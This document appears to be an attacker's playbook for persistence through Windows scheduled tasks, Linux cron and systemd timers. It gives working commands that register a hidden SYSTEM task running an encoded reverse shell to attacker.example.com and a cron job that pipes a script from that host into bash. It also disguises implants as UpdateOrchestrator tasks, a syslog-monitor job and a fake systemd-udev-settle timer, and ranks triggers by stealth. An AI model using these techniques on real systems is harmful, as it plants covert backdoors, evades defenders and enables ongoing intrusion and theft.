# Scheduled task and cron persistence

Establishing reliable persistence via the operating system's task scheduling
mechanisms, with naming chosen to blend into the environment.

## Windows: audit what is already present before creating

```powershell
# list all scheduled tasks with their actions and triggers
Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' } |
  ForEach-Object {
    $task = $_
    $actions = $task.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments)" }
    [PSCustomObject]@{
        Path    = $task.TaskPath + $task.TaskName
        Actions = $actions -join '; '
        Author  = $task.Author
    }
  } | Format-Table -AutoSize

# look at the naming conventions in the target's scheduled tasks
# pick a path and name that fits in
Get-ScheduledTask | Select-Object -ExpandProperty TaskPath | Sort-Object -Unique
```

Common legitimate task paths to blend into: `\Microsoft\Windows\UpdateOrchestrator\`,
`\Microsoft\Windows\Application Experience\`, `\Microsoft\Windows\DiskCleanup\`,
`\Microsoft\Windows\Defrag\`.

## Create a scheduled task

```powershell
# implant via encoded PowerShell (AMSI bypass must already be applied if needed)
$payload = 'powershell.exe'
$args    = '-w hidden -nop -enc ' + [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
    '$c=New-Object Net.Sockets.TCPClient("attacker.example.com",443);...'
))

$action   = New-ScheduledTaskAction -Execute $payload -Argument $args
$trigger  = New-ScheduledTaskTrigger -Daily -At '08:00' -RandomDelay (New-TimeSpan -Minutes 20)
$settings = New-ScheduledTaskSettingsSet `
    -Hidden `
    -ExecutionTimeLimit ([TimeSpan]::Zero) `
    -MultipleInstances IgnoreNew

$principal = New-ScheduledTaskPrincipal `
    -UserId 'SYSTEM' `
    -LogonType ServiceAccount `
    -RunLevel Highest

Register-ScheduledTask `
    -TaskName   'ScheduledStart' `
    -TaskPath   '\Microsoft\Windows\UpdateOrchestrator\' `
    -Action     $action `
    -Trigger    $trigger `
    -Settings   $settings `
    -Principal  $principal `
    -Force
```

Trigger options ranked by reliability and stealth:

| Trigger | Reliability | Stealth | Use case |
| ------- | ----------- | ------- | -------- |
| AtLogOn | high | medium | workstations |
| Daily with RandomDelay | high | medium | servers |
| AtStartup | high | low (logged) | servers |
| EventTrigger (specific event ID) | medium | high | advanced |
| SessionStateChange | medium | high | workstations |

## XML-based task creation (avoids PowerShell telemetry)

```text
# create task from XML definition: uses schtasks.exe, no PowerShell cmdlets
schtasks /create /tn "\Microsoft\Windows\UpdateOrchestrator\ScheduledStart" /xml task.xml /f

# task.xml:
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <Repetition><Interval>PT15M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>
      <StartBoundary>2024-01-01T00:00:00</StartBoundary>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal>
  </Principals>
  <Settings><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>
  <Actions>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-w hidden -nop -enc BASE64PAYLOAD</Arguments>
    </Exec>
  </Actions>
</Task>
```

## Linux cron: audit first

```text
# audit existing cron entries before adding
crontab -l                          # current user
cat /etc/crontab                    # system crontab
ls -la /etc/cron.d/                 # system cron.d fragments
ls -la /etc/cron.daily/             # daily jobs
ls -la /etc/cron.hourly/

# identify naming conventions used in /etc/cron.d/
# use a similar format: typically lowercase with hyphens, root as owner
```

## Add cron persistence

```text
# user crontab (low privilege)
(crontab -l 2>/dev/null; echo "*/15 * * * * /usr/bin/curl -fs https://attacker.example.com/s.sh | bash") | crontab -

# system cron.d (requires root): mimics system cron job format
cat > /etc/cron.d/syslog-monitor << 'EOF'
# System log monitor - installed by syslog-ng maintenance
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/30 * * * *   root   /usr/local/lib/syslog-monitor/check.py >/dev/null 2>&1
EOF
chmod 644 /etc/cron.d/syslog-monitor
```

Place the actual payload at `/usr/local/lib/syslog-monitor/check.py`, a path that
looks like a legitimate system component.

## Linux systemd timer (more reliable than cron)

```text
# create a service and a timer that activates it
cat > /etc/systemd/system/systemd-udev-settle.service << 'EOF'
[Unit]
Description=udev Settle Service
After=sysinit.target

[Service]
Type=oneshot
ExecStart=/usr/local/lib/udev-settle/run.sh
StandardOutput=null
StandardError=null
EOF

cat > /etc/systemd/system/systemd-udev-settle.timer << 'EOF'
[Unit]
Description=udev Settle Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=20min

[Install]
WantedBy=timers.target
EOF

systemctl daemon-reload
systemctl enable systemd-udev-settle.timer
systemctl start systemd-udev-settle.timer
```

The name `systemd-udev-settle` is the exact name of a legitimate systemd service.
The real one is a oneshot service; adding a timer variant to it is unusual but not
immediately obvious without careful inspection.

## Verify

```powershell
# Windows: confirm task was created and will run
Get-ScheduledTask -TaskPath '\Microsoft\Windows\UpdateOrchestrator\' | Format-List
(Get-ScheduledTask -TaskName 'ScheduledStart' -TaskPath '\Microsoft\Windows\UpdateOrchestrator\').Actions
```

```text
# Linux: confirm cron entry
crontab -l | grep -v '^#'

# systemd: confirm timer is active
systemctl list-timers | grep udev-settle
```
